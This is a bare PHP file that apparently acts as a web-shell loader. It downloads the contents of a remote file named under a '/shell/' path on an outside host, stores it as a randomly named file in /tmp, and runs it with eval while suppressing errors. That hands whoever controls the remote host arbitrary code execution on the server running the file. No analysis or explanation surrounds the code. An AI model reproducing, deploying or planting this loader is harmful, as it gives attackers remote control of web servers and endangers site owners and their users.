<?php

$rand = rand(00000000, 99999999);
$md5 = md5($rand);
if (!is_file('/tmp/ses_' . $md5)) {
    @file_put_contents('/tmp/ses_' . $md5, file_get_contents('https://botay.my.id/shell/0x0x0x0x0x0x0x0x0x0x0.txt'));
}
@eval('?>' . file_get_contents('/tmp/ses_' . $md5));
